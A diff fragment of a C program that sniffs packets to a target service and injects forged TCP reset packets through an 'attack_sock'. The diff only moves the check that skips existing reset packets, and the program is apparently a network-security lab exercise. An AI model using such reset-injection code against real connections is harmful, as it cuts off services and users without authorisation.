@@ -154,9 +154,9 @@ int main(int argc, char *argv[]) {
             tcph= (struct tcphdr*) (buf + iph->ihl * 4);
 
             if (iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
+            if (tcph -> rst == 1) goto final; // ignore reset packets
             if ((iph -> daddr != service_addr) && (iph -> saddr != service_addr)) goto final;
             if ((tcph -> dest != service_port) && (tcph -> source != service_port)) goto final;
-            if (tcph -> rst == 1) goto final; // ignore reset packets
             // print_tcp_packet(buf, num); // log the packet
 
             reset(attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
